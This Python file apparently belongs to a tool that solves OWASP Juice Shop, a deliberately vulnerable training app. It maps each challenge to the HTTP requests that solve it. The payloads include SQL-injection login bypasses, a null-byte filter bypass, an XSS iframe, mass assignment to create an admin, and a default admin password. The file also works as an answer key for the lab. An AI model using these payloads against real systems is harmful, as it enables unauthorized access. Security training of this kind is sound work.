from __future__ import annotations

CHALLENGE_HINTS: dict[str, dict] = {
    "scoreBoardChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/api/Challenges/"}],
        "note": "Accessing the challenges API or /#/score-board solves it",
    },
    "errorHandlingChallenge": {
        "approach": "error_trigger",
        "steps": [{"method": "GET", "endpoint": "/rest/qwertz"}],
        "note": "Trigger a server error by accessing a non-existent REST endpoint",
    },
    "loginAdminChallenge": {
        "approach": "sqli",
        "steps": [
            {"method": "POST", "endpoint": "/rest/user/login",
             "body": {"email": "' OR 1=1--", "password": "x"}}
        ],
    },
    "loginBenderChallenge": {
        "approach": "sqli",
        "steps": [
            {"method": "POST", "endpoint": "/rest/user/login",
             "body": {"email": "bender@juice-sh.op'--", "password": "x"}}
        ],
    },
    "loginJimChallenge": {
        "approach": "sqli",
        "steps": [
            {"method": "POST", "endpoint": "/rest/user/login",
             "body": {"email": "jim@juice-sh.op'--", "password": "x"}}
        ],
    },
    "adminSectionChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/#/administration"}],
        "requires_auth": "admin",
        "note": "Need admin JWT to access",
    },
    "basketAccessChallenge": {
        "approach": "idor",
        "steps": [{"method": "GET", "endpoint": "/rest/basket/2"}],
        "requires_auth": "user",
    },
    "forgedFeedbackChallenge": {
        "approach": "parameter_tampering",
        "steps": [
            {"method": "POST", "endpoint": "/api/Feedbacks/",
             "body": {"UserId": 1, "rating": 5, "comment": "forged"}}
        ],
        "requires_auth": "user",
    },
    "zeroStarChallenge": {
        "approach": "parameter_tampering",
        "steps": [
            {"method": "POST", "endpoint": "/api/Feedbacks/",
             "body": {"UserId": 1, "rating": 0, "comment": "zero stars", "captchaId": 0, "captcha": ""}}
        ],
    },
    "confidentialDocumentChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/ftp/acquisitions.md"}],
    },
    "forgottenDeveloperBackupChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/ftp/package.json.bak%2500.md"}],
        "note": "Null byte bypass for file extension filter",
    },
    "forgottenBackupChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/ftp/coupons_2013.md.bak%2500.md"}],
    },
    "redirectChallenge": {
        "approach": "open_redirect",
        "steps": [
            {"method": "GET", "endpoint": "/redirect",
             "params": {"to": "https://owasp.org"}}
        ],
    },
    "passwordStrengthChallenge": {
        "approach": "brute_force",
        "steps": [
            {"method": "POST", "endpoint": "/rest/user/login",
             "body": {"email": "admin@juice-sh.op", "password": "admin123"}}
        ],
    },
    "feedbackChallenge": {
        "approach": "parameter_tampering",
        "steps": [
            {"method": "POST", "endpoint": "/api/Feedbacks/",
             "body": {"UserId": 2, "rating": 5, "comment": "feedback as other user"}}
        ],
        "requires_auth": "user",
    },
    "productTamperingChallenge": {
        "approach": "api_abuse",
        "steps": [
            {"method": "PUT", "endpoint": "/api/Products/1",
             "body": {"description": "<a href=\"https://owasp.org\" target=\"_blank\">More...</a>"}}
        ],
        "requires_auth": "admin",
    },
    "restfulXssChallenge": {
        "approach": "xss",
        "steps": [
            {"method": "PUT", "endpoint": "/api/Products/1",
             "body": {"description": "<iframe src=\"javascript:alert(`xss`)\">"}}
        ],
        "requires_auth": "admin",
    },
    "exposedMetricsChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/metrics"}],
    },
    "missingEncodingChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/assets/public/images/uploads/%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"}],
    },
    "deprecatedInterfaceChallenge": {
        "approach": "forced_browsing",
        "steps": [{"method": "GET", "endpoint": "/api-docs/"}],
        "note": "Access the B2B interface / Swagger docs",
    },
    "privacyPolicyChallenge": {
        "approach": "browser_navigate",
        "steps": [{"method": "browser_navigate", "endpoint": "/#/privacy-security/privacy-policy"}],
    },
    "registerAdminChallenge": {
        "approach": "mass_assignment",
        "steps": [
            {"method": "POST", "endpoint": "/api/Users/",
             "body": {
                 "email": "newadmin@test.com",
                 "password": "admin123",
                 "passwordRepeat": "admin123",
                 "role": "admin",
                 "securityQuestion": {"id": 1, "question": "test"},
                 "securityAnswer": "test",
             }}
        ],
    },
}
